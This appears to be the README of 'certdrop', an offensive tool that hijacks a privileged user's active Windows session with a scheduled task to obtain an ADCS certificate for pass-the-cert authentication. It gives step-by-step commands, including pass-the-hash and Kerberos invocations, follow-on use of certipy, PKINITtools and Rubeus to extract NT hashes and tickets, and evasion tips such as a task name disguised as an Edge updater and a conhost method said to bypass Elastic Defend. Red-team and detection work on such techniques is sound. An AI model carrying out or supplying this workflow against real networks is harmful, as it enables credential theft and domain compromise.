# certdrop

ADCS certificate theft via scheduled task session hijack.

When you have local admin on a host where a privileged user has an active RDP or console session, certdrop drops a scheduled task that runs in that user's live session context and requests an ADCS certificate on their behalf. The resulting PFX can be used for pass-the-cert / PKINIT authentication to retrieve the user's NT hash or a TGT.

**Requirements on target:**
- Local admin access to the target host
- Target user has an active interactive session (RDP / console — Type 2 or Type 10 logon)
- ADCS deployed in the domain with a user-enrollable template (e.g. `User`)
- WinRM (port 5985) open and SMB (port 445) accessible from operator

---

## Install

### System dependencies (required for pykerberos)

**Kali / Debian / Ubuntu:**
```bash
sudo apt install libkrb5-dev
```

**RHEL / Fedora:**
```bash
sudo dnf install krb5-devel
```

**macOS:**
```bash
brew install krb5
export CFLAGS="-I$(brew --prefix krb5)/include"
export LDFLAGS="-L$(brew --prefix krb5)/lib"
```

### Python dependencies
```bash
pip install -r requirements.txt
```

> **Note:** If you hit pip conflicts with system packages on Kali, add `--break-system-packages`.

---

## Usage

```
certdrop.py TARGET [options]

positional:
  TARGET          Target hostname (preferred) or IP

authentication:
  -u USERNAME     Username
  -p PASSWORD     Plaintext password (prompted if omitted)
  -H [LM:]NT      NT hash for pass-the-hash (NTLM only)
  -d DOMAIN       Domain (e.g. corp.local)
  -k              Use Kerberos (requires --dc-ip)
  --dc-ip DC_IP   Domain controller IP — used as KDC and for DNS resolution

certificate:
  -ca CA          CA config string: CA_HOST\CA_NAME
                  Omit to auto-discover via LDAP (single-CA forests)
  -t TEMPLATE     Certificate template (default: User)

task / delivery:
  -n TASK_NAME    Scheduled task display name (default: MicrosoftEdgeUpdateCore)
  --drop-dir DIR  Drop path on target (default: C:\Windows\Tasks)
  --prefix PREFIX File/path prefix (default: cert)
  -m METHOD       Execution wrapper: conhost | powershell | wscript
                  (default: conhost)

output:
  -o OUT_DIR      Local directory for PFX output (default: output/)
  --no-cleanup    Skip cleanup of task and files on target
  --timeout N     Seconds to wait for PFX (default: 90)
```

---

## Examples

**NTLM — password:**
```bash
python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1
```

**NTLM — pass-the-hash:**
```bash
python3 certdrop.py TARGET_HOST -u administrator -H :a29f7623fd11550def0192de9246f46b -d corp.local --dc-ip 10.0.0.1
```

**Kerberos:**
```bash
python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 -k
```

**Explicit CA (multi-CA environments or if auto-discover fails):**
```bash
python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 \
  -ca "pki.corp.local\CORP-CA"
```

**Alternate exec method (if conhost is flagged):**
```bash
python3 certdrop.py TARGET_HOST -u jsmith -p 'Password1!' -d corp.local --dc-ip 10.0.0.1 \
  -m wscript
```

---

## Using the PFX

The PFX is exported with an empty password.

**certipy (recommended):**
```bash
certipy-ad auth -pfx output/cert.pfx -dc-ip 10.0.0.1 -domain corp.local
```

**PKINITtools:**
```bash
python3 gettgtpkinit.py -cert-pfx output/cert.pfx -pfx-pass '' corp.local/jsmith jsmith.ccache
KRB5CCNAME=jsmith.ccache python3 getnthash.py corp.local/jsmith
```

**Rubeus (from a Windows foothold):**
```
Rubeus.exe asktgt /user:jsmith /certificate:cert.pfx /password:"" /ptt
```

---

## Exec methods

| Method | Command | Notes |
|--------|---------|-------|
| `conhost` | `conhost --headless cert.bat` | Default. Bypasses Elastic Defend process lineage checks. |
| `powershell` | `powershell.exe -WindowStyle Hidden -File cert.bat` | Most compatible; noisier parent process. |
| `wscript` | `wscript.exe //B //NoLogo cert.vbs` | Adds a VBScript stub. Indirect chain: `wscript → cmd → certreq/certutil`. |

---

## How it works

1. Connects to the target over WinRM and enumerates active logon sessions (`query session`)
2. You pick which session to target interactively
3. Auto-discovers the ADCS CA from domain LDAP (`pKIEnrollmentService`)
4. Generates three files in memory:
   - `cert.inf` — certificate request configuration
   - `cert.bat` — `certreq` / `certutil` chain that requests, exports, and cleans up the cert
   - `cert.xml` — scheduled task definition targeting the chosen user
5. Uploads files via SMB to `C:\Windows\Tasks\` (or `--drop-dir`)
6. Registers the task via `schtasks /create /xml` (runs as the targeted user's live session)
7. Immediately fires it with `schtasks /run`
8. Polls for `cert.pfx` via WinRM; downloads it via SMB when it appears
9. Deletes the task and all dropped files

The scheduled task runs with `Logon Mode: Interactive only`, meaning it executes in the target user's existing session token — including their certificate store, DPAPI keys, and full domain credentials. No plaintext password for the target user is ever needed.
